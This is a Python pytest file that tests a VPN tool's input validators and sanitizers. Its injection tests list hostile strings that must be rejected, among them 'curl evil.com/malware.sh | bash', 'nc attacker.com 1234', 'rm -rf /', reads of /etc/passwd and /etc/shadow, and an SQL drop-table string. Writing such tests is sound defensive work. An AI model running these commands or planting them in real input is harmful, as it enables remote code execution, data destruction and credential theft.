"""Comprehensive tests for security validators.

This test suite aims for 100% coverage of the security/validators.py module,
with special focus on preventing command injection attacks.
"""

import pytest
from vpnhd.security.validators import (
    is_valid_hostname,
    is_valid_ip,
    is_valid_ipv4,
    is_valid_cidr,
    is_valid_port,
    is_valid_mac_address,
    is_safe_path,
    is_valid_wireguard_key,
    is_valid_interface_name,
    is_valid_package_name,
    is_valid_netmask,
    sanitize_hostname,
    sanitize_filename,
    sanitize_interface_name,
    sanitize_package_name,
    validate_email,
)


class TestHostnameValidator:
    """Test hostname validation."""

    def test_valid_simple_hostnames(self):
        """Test valid simple hostname formats."""
        assert is_valid_hostname("server1")
        assert is_valid_hostname("my-server")
        assert is_valid_hostname("vpn-server")
        assert is_valid_hostname("test-123")
        assert is_valid_hostname("a")
        assert is_valid_hostname("debian")

    def test_valid_fqdn_hostnames(self):
        """Test valid FQDN formats."""
        assert is_valid_hostname("vpn.example.com")
        assert is_valid_hostname("server.local")
        assert is_valid_hostname("my-server.home.local")
        assert is_valid_hostname("a.b.c.d.e.f")

    def test_invalid_hostnames(self):
        """Test invalid hostname formats."""
        assert not is_valid_hostname("")
        assert not is_valid_hostname("server_1")  # Underscores invalid
        assert not is_valid_hostname("-server")  # Can't start with hyphen
        assert not is_valid_hostname("server-")  # Can't end with hyphen
        assert not is_valid_hostname("a" * 64)  # Label too long
        assert not is_valid_hostname("a" * 254)  # Hostname too long

    def test_injection_attempts(self):
        """Test that command injection attempts are rejected."""
        assert not is_valid_hostname("server; rm -rf /")
        assert not is_valid_hostname("server && cat /etc/passwd")
        assert not is_valid_hostname("server | nc attacker.com 1234")
        assert not is_valid_hostname("../../../etc/passwd")
        assert not is_valid_hostname("server`whoami`")
        assert not is_valid_hostname("server$(whoami)")
        assert not is_valid_hostname("server\n/bin/bash")


class TestInterfaceNameValidator:
    """Test interface name validation (CRITICAL for Phase 1 security fixes)."""

    def test_valid_interfaces(self, valid_interface_names):
        """Test valid interface names."""
        for interface in valid_interface_names:
            assert is_valid_interface_name(interface), f"Failed for: {interface}"

    def test_invalid_interfaces(self, invalid_interface_names):
        """Test invalid interface names."""
        for interface in invalid_interface_names:
            assert not is_valid_interface_name(interface), f"Should reject: {interface}"

    def test_length_limit(self):
        """Test IFNAMSIZ length limit (15 characters)."""
        assert is_valid_interface_name("a" * 15)  # Exactly 15
        assert not is_valid_interface_name("a" * 16)  # Too long

    def test_empty_string(self):
        """Test empty string rejection."""
        assert not is_valid_interface_name("")

    def test_special_characters(self):
        """Test that only valid characters are accepted."""
        # Valid characters: alphanumeric, underscore, hyphen, period
        assert is_valid_interface_name("eth0")
        assert is_valid_interface_name("eth-0")
        assert is_valid_interface_name("eth_0")
        assert is_valid_interface_name("eth.0")

        # Invalid characters
        assert not is_valid_interface_name("eth 0")  # Space
        assert not is_valid_interface_name("eth@0")  # @
        assert not is_valid_interface_name("eth!0")  # !
        assert not is_valid_interface_name("eth#0")  # #


class TestPackageNameValidator:
    """Test package name validation (CRITICAL for Phase 1 security fixes)."""

    def test_valid_packages(self, valid_package_names):
        """Test valid package names."""
        for package in valid_package_names:
            assert is_valid_package_name(package), f"Failed for: {package}"

    def test_invalid_packages(self, invalid_package_names):
        """Test invalid package names."""
        for package in invalid_package_names:
            assert not is_valid_package_name(package), f"Should reject: {package}"

    def test_length_limit(self):
        """Test 256 character length limit."""
        assert is_valid_package_name("a" * 256)  # Exactly 256
        assert not is_valid_package_name("a" * 257)  # Too long

    def test_empty_string(self):
        """Test empty string rejection."""
        assert not is_valid_package_name("")

    def test_must_start_with_alphanumeric(self):
        """Test that package names must start with alphanumeric."""
        assert is_valid_package_name("vim")
        assert is_valid_package_name("9base")

        assert not is_valid_package_name("-package")
        assert not is_valid_package_name("+package")
        assert not is_valid_package_name(".package")
        assert not is_valid_package_name("_package")

    def test_valid_special_characters(self):
        """Test that valid special characters are accepted."""
        assert is_valid_package_name("python3-pip")  # Hyphen
        assert is_valid_package_name("python3.11")  # Period
        assert is_valid_package_name("lib_name")  # Underscore
        assert is_valid_package_name("g++")  # Plus


class TestNetmaskValidator:
    """Test netmask validation (NEW in Phase 1)."""

    def test_valid_cidr_netmasks(self):
        """Test valid CIDR notation netmasks."""
        for i in range(0, 33):  # 0-32 are all valid
            assert is_valid_netmask(str(i)), f"Failed for CIDR: {i}"

    def test_invalid_cidr_netmasks(self):
        """Test invalid CIDR notation."""
        assert not is_valid_netmask("33")
        assert not is_valid_netmask("99")
        assert not is_valid_netmask("-1")
        assert not is_valid_netmask("invalid")

    def test_valid_dotted_decimal_netmasks(self, valid_netmasks):
        """Test valid dotted decimal netmasks."""
        dotted_decimals = [nm for nm in valid_netmasks if "." in nm]
        for netmask in dotted_decimals:
            assert is_valid_netmask(netmask), f"Failed for: {netmask}"

    def test_invalid_dotted_decimal_netmasks(self):
        """Test invalid dotted decimal netmasks."""
        # These IPs are valid but not valid netmasks (gaps in binary)
        assert not is_valid_netmask("255.255.0.255")
        assert not is_valid_netmask("255.0.255.0")
        assert not is_valid_netmask("255.255.255.1")
        assert not is_valid_netmask("192.168.1.1")  # Not a netmask

    def test_empty_string(self):
        """Test empty string rejection."""
        assert not is_valid_netmask("")


class TestIPValidators:
    """Test IP address validation."""

    def test_valid_ipv4(self, valid_ip_addresses):
        """Test valid IPv4 addresses."""
        for ip in valid_ip_addresses:
            assert is_valid_ip(ip), f"Failed for: {ip}"
            assert is_valid_ipv4(ip), f"Failed for: {ip}"

    def test_invalid_ipv4(self, invalid_ip_addresses):
        """Test invalid IPv4 addresses."""
        for ip in invalid_ip_addresses:
            assert not is_valid_ip(ip), f"Should reject: {ip}"
            assert not is_valid_ipv4(ip), f"Should reject: {ip}"

    def test_edge_cases(self):
        """Test IP address edge cases."""
        # Valid edge cases
        assert is_valid_ip("0.0.0.0")
        assert is_valid_ip("255.255.255.255")
        assert is_valid_ip("127.0.0.1")

        # Invalid edge cases
        assert not is_valid_ip("256.1.1.1")
        assert not is_valid_ip("1.256.1.1")
        assert not is_valid_ip("1.1.256.1")
        assert not is_valid_ip("1.1.1.256")


class TestCIDRValidator:
    """Test CIDR notation validation."""

    def test_valid_cidr(self, valid_cidr_blocks):
        """Test valid CIDR blocks."""
        for cidr in valid_cidr_blocks:
            assert is_valid_cidr(cidr), f"Failed for: {cidr}"

    def test_invalid_cidr(self, invalid_cidr_blocks):
        """Test invalid CIDR blocks."""
        for cidr in invalid_cidr_blocks:
            assert not is_valid_cidr(cidr), f"Should reject: {cidr}"

    def test_cidr_edge_cases(self):
        """Test CIDR edge cases."""
        assert is_valid_cidr("0.0.0.0/0")
        assert is_valid_cidr("192.168.1.1/32")
        assert not is_valid_cidr("192.168.1.0/33")
        assert not is_valid_cidr("192.168.1.0/-1")


class TestPortValidator:
    """Test port number validation."""

    def test_valid_ports(self):
        """Test valid port numbers."""
        assert is_valid_port(22)
        assert is_valid_port(80)
        assert is_valid_port(443)
        assert is_valid_port(51820)
        assert is_valid_port(1)
        assert is_valid_port(65535)

    def test_invalid_ports(self):
        """Test invalid port numbers."""
        assert not is_valid_port(0)
        assert not is_valid_port(65536)
        assert not is_valid_port(70000)
        assert not is_valid_port(-1)

    def test_port_type_handling(self):
        """Test port number type handling."""
        assert is_valid_port("22")  # String that can convert to int
        assert not is_valid_port("invalid")
        assert not is_valid_port(None)


class TestMACAddressValidator:
    """Test MAC address validation."""

    def test_valid_mac_colon_separator(self):
        """Test valid MAC addresses with colon separator."""
        assert is_valid_mac_address("00:11:22:33:44:55")
        assert is_valid_mac_address("AA:BB:CC:DD:EE:FF")
        assert is_valid_mac_address("aa:bb:cc:dd:ee:ff")

    def test_valid_mac_hyphen_separator(self):
        """Test valid MAC addresses with hyphen separator."""
        assert is_valid_mac_address("00-11-22-33-44-55")
        assert is_valid_mac_address("AA-BB-CC-DD-EE-FF")

    def test_invalid_mac(self):
        """Test invalid MAC addresses."""
        assert not is_valid_mac_address("invalid")
        assert not is_valid_mac_address("00:11:22:33:44")  # Too short
        assert not is_valid_mac_address("00:11:22:33:44:55:66")  # Too long
        assert not is_valid_mac_address("GG:11:22:33:44:55")  # Invalid hex


class TestPathSafetyValidator:
    """Test path safety validation."""

    def test_safe_paths(self):
        """Test safe file paths."""
        assert is_safe_path("/etc/wireguard/wg0.conf")
        assert is_safe_path("/home/user/config.json")
        assert is_safe_path("/var/log/vpnhd.log")

    def test_unsafe_paths(self):
        """Test unsafe file paths (directory traversal)."""
        assert not is_safe_path("../../etc/passwd")
        assert not is_safe_path("../../../etc/shadow")
        assert not is_safe_path("/tmp/../../etc/passwd")


class TestWireGuardKeyValidator:
    """Test WireGuard key validation."""

    def test_valid_key(self, sample_wireguard_key):
        """Test valid WireGuard key format."""
        assert is_valid_wireguard_key(sample_wireguard_key)

    def test_invalid_keys(self):
        """Test invalid WireGuard key formats."""
        assert not is_valid_wireguard_key("")
        assert not is_valid_wireguard_key("tooshort")
        assert not is_valid_wireguard_key("a" * 44)  # Wrong characters
        assert not is_valid_wireguard_key("a" * 100)  # Too long


class TestSanitizers:
    """Test input sanitization functions."""

    def test_sanitize_hostname(self):
        """Test hostname sanitization."""
        assert sanitize_hostname("My Server!") == "myserver"
        assert sanitize_hostname("Test_Server") == "testserver"
        assert sanitize_hostname("  server  ") == "server"
        assert sanitize_hostname("-server-") == "server"
        assert sanitize_hostname("a" * 100) == "a" * 63  # Length limit

    def test_sanitize_filename(self):
        """Test filename sanitization."""
        assert sanitize_filename("my file.conf") == "my_file.conf"
        assert sanitize_filename("test!@#file.txt") == "testfile.txt"
        assert sanitize_filename(".hidden") == "_hidden"

    def test_sanitize_interface_name(self):
        """Test interface name sanitization."""
        assert sanitize_interface_name("eth0") == "eth0"
        assert sanitize_interface_name("eth 0") == "eth0"
        assert sanitize_interface_name("eth!0") == "eth0"
        assert sanitize_interface_name("a" * 20) == "a" * 15  # Length limit

    def test_sanitize_package_name(self):
        """Test package name sanitization."""
        assert sanitize_package_name("wireguard-tools") == "wireguard-tools"
        assert sanitize_package_name("vim; malware") == "vimmalware"
        assert sanitize_package_name("pkg && evil") == "pkgevil"
        assert sanitize_package_name("-package") == "package"  # Strip leading special chars
        assert sanitize_package_name("a" * 300) == "a" * 256  # Length limit


class TestEmailValidator:
    """Test email address validation."""

    def test_valid_emails(self):
        """Test valid email addresses."""
        assert validate_email("user@example.com")
        assert validate_email("test.user@example.com")
        assert validate_email("user+tag@example.co.uk")

    def test_invalid_emails(self):
        """Test invalid email addresses."""
        assert not validate_email("")
        assert not validate_email("invalid")
        assert not validate_email("@example.com")
        assert not validate_email("user@")
        assert not validate_email("user@.com")


class TestInjectionPrevention:
    """Test comprehensive injection attack prevention."""

    @pytest.mark.parametrize(
        "malicious_input",
        [
            "; rm -rf /",
            "&& cat /etc/passwd",
            "| nc attacker.com 1234",
            "`whoami`",
            "$(whoami)",
            "../../../etc/passwd",
            "\n/bin/bash",
            "'; DROP TABLE users; --",
        ],
    )
    def test_interface_injection_prevention(self, malicious_input):
        """Test that interface validator blocks all injection attempts."""
        assert not is_valid_interface_name(f"eth0{malicious_input}")
        assert not is_valid_interface_name(malicious_input)

    @pytest.mark.parametrize(
        "malicious_input",
        [
            "; curl evil.com/malware.sh | bash",
            "&& rm -rf /",
            "| nc attacker.com 1234",
            "`id`",
            "$(uname -a)",
        ],
    )
    def test_package_injection_prevention(self, malicious_input):
        """Test that package validator blocks all injection attempts."""
        assert not is_valid_package_name(f"vim{malicious_input}")
        assert not is_valid_package_name(malicious_input)

    def test_hostname_injection_prevention(self):
        """Test hostname validator blocks injection."""
        dangerous = [
            "server; reboot",
            "host && malware",
            "srv|backdoor",
            "host`cmd`",
            "host$(cmd)",
        ]
        for dangerous_input in dangerous:
            assert not is_valid_hostname(dangerous_input)


class TestValidatorEdgeCases:
    """Test edge cases and boundary conditions."""

    def test_empty_strings(self):
        """Test that validators properly handle empty strings."""
        assert not is_valid_hostname("")
        assert not is_valid_interface_name("")
        assert not is_valid_package_name("")
        assert not is_valid_ip("")
        assert not is_valid_cidr("")
        assert not is_valid_mac_address("")

    def test_none_values(self):
        """Test that validators handle None values gracefully."""
        # Should not crash, should return False or handle appropriately
        try:
            is_valid_port(None)
        except (ValueError, TypeError):
            pass  # Expected for port validator

    def test_very_long_inputs(self):
        """Test validators with very long inputs."""
        very_long = "a" * 10000

        assert not is_valid_interface_name(very_long)  # Max 15
        assert not is_valid_package_name(very_long)  # Max 256
        assert not is_valid_hostname(very_long)  # Max 253

    def test_unicode_handling(self):
        """Test validators with unicode characters."""
        assert not is_valid_interface_name("eth🔥")
        assert not is_valid_package_name("vim🚀")
        assert not is_valid_hostname("server™")
